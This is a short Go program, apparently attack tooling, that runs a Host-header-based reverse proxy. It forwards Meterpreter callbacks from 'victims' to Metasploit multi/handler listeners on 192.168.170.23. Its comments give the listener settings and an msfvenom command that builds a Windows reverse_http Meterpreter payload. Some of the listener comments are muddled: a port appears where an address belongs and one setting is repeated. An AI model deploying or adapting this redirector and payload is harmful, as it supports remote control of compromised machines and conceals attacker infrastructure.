package main

import (
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"

	"github.com/gorilla/mux"
)

// use this proxy to redirect victim to metasploit listener.
// Host header is defined via msfvenom

//domain1
//msf5 exploit(multi/handler) > set ReverseListenerBindAddress 192.168.170.23
//msf5 exploit(multi/handler) > set ReverseListenerBindAddress 9001
//domain2
//msf5 exploit(multi/handler) > set ReverseListenerBindAddress 192.168.170.23
//msf5 exploit(multi/handler) > set ReverseListenerBindAddress 192.168.170.23

//Payload
//msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.170.23 LPORT=80 HttpHostHeader=domain1.local

var (
	hostProxy = make(map[string]string)
	proxies   = make(map[string]*httputil.ReverseProxy)
)

func init() {

	hostProxy["mydomain1.local"] = "http://192.168.170.23:9001"
	hostProxy["mydomain2.local"] = "http://192.168.170.23:9002"

	for k, v := range hostProxy {
		url, err := url.Parse(v)
		if err != nil {
			log.Fatal(err)
		}
		proxies[k] = httputil.NewSingleHostReverseProxy(url)

	}
}

func main() {
	r := mux.NewRouter()
	for host, proxy := range proxies {
		r.Host(host).Handler(proxy)
	}
	log.Fatal(http.ListenAndServe(":80", r))
}
